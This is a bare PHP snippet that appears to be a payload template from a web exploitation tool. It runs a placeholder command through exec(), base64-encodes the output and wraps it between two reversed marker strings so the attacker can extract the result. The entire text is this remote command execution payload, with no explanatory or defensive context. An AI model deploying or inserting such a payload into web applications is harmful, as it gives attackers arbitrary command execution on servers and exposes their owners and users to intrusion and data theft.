echo strrev("15825b40c6dace2a");
if ( '__CMD_TO_RUN__' !== '' ){
 $ar = array(); $ou = "";
 exec('__CMD_TO_RUN__', $ar);
 foreach ($ar as $k=>$v){$ou = $ou . "$v\n";}
 echo base64_encode($ou);
}
echo strrev("7cf5d4ab8ed434d5");

